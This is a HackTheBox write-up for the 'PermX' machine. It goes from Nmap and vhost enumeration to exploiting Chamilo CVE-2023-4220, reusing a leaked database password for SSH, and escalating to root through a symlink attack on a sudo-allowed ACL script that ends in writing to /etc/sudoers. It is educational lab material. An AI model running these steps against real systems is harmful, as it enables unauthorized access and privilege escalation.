---
title: "PermX — HackTheBox"
date: 2026-03-21
type: writeup
summary: "A Chamilo upload flaw (CVE-2023-4220) gave RCE; reused DB credentials and a symlink ACL flaw gave root."
tags:
  - chamilo
  - cve-2023-4220
  - file-upload
  - credential-reuse
  - symlink-attack
  - privilege-escalation
difficulty: easy
---

## Reconnaissance

Standard Nmap service scan:

```bash
nmap -sCV 10.129.4.69
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://permx.htb
|_http-server-header: Apache/2.4.52 (Ubuntu)
```

Two ports open: **SSH (22)** and **HTTP (80)**. The HTTP service redirects to `permx.htb`, so the hostname was added to `/etc/hosts`:

```bash
echo "10.129.4.69 permx.htb" >> /etc/hosts
```

## Virtual Host Enumeration

With a virtual-host-based setup, subdomains were fuzzed using Gobuster:

```bash
gobuster vhost -u http://permx.htb/ \
  -w seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -t 50
```

```
lms.permx.htb   Status: 200 [Size: 19347]
```

A subdomain `lms.permx.htb` was discovered and added to `/etc/hosts`. Visiting it revealed an instance of **Chamilo LMS** — an open-source e-learning platform.

## Directory Enumeration and Version Fingerprinting

Content discovery was run against the LMS subdomain:

```bash
gobuster dir -u http://lms.permx.htb/ \
  -w /seclists/Discovery/Web-Content/common.txt
```

```
/app              (Status: 301)
/bin              (Status: 301)
/documentation    (Status: 301)
/main             (Status: 301)
/plugin           (Status: 301)
/vendor           (Status: 301)
/web              (Status: 301)
/robots.txt       (Status: 200)
/web.config       (Status: 200)
```

Navigating to `http://lms.permx.htb/documentation/readme.html` confirmed the exact version in use:

```
Chamilo 1.11
```

A search for public CVEs against this version surfaced **CVE-2023-4220** — an unauthenticated file upload vulnerability in Chamilo's large file upload endpoint that allows arbitrary PHP files to be written to the server, resulting in remote code execution.

## Initial Foothold — CVE-2023-4220

CVE-2023-4220 abuses an unrestricted file upload in Chamilo's `/main/inc/lib/javascript/bigupload/` endpoint, which does not require authentication and does not validate uploaded file extensions. Uploading a PHP web shell or reverse shell payload directly to this path places it in a web-accessible location.

<!-- TODO(owner): Original PermX screenshot poc1.png is missing from the old portfolio source. -->

A publicly available PoC was used to upload a reverse shell payload. A listener was started first:

```bash
nc -lvnp 4444
```

After running the exploit, a shell was received as `www-data`.

### Credential Discovery

With filesystem access, the Chamilo configuration file was read to extract database credentials:

```bash
cat /var/www/chamilo/app/config/configuration.php
```

```php
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
```

## Lateral Movement — Database Credential Reuse

The database password was tested against the system user `mtz` over SSH — a common misconfiguration where application credentials are reused for a system account:

```bash
ssh mtz@permx.htb
# Password: 03F6lY3uXAP2bkW8
```

Login succeeded.

## Privilege Escalation — Symlink Attack via acl.sh

### Sudo Enumeration

```bash
mtz@permx:~$ sudo -l
```

```
User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```

### Analysing acl.sh

```bash
cat /opt/acl.sh
```

```bash
#!/bin/bash

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

The script accepts a file path and grants a user ACL permissions on it using `setfacl`. Two security controls are applied:

- The target path **must begin with** `/home/mtz/`
- The target path **must not contain** `..`

The flaw is that these checks are performed on the **path string itself**, not on the **resolved file**. If the target is a **symlink** inside `/home/mtz/` that points to a sensitive file elsewhere on the filesystem, the string checks pass but `setfacl` operates on the symlink's target — the real file.

### Exploit

A symlink was created inside the home directory pointing to `/etc/sudoers`:

```bash
ln -s /etc/sudoers /home/mtz/sudoers_link
```

The path `/home/mtz/sudoers_link` passes both checks — it starts with `/home/mtz/` and contains no `..`. The script then runs `setfacl` and grants `mtz` read/write access to `/etc/sudoers` itself:

```bash
sudo /opt/acl.sh mtz rw /home/mtz/sudoers_link
```

With write access to `/etc/sudoers`, a new rule was appended directly:

```bash
echo "mtz ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
```

Escalating to root:

```bash
sudo su
```

```
root@permx:~# whoami
root
```
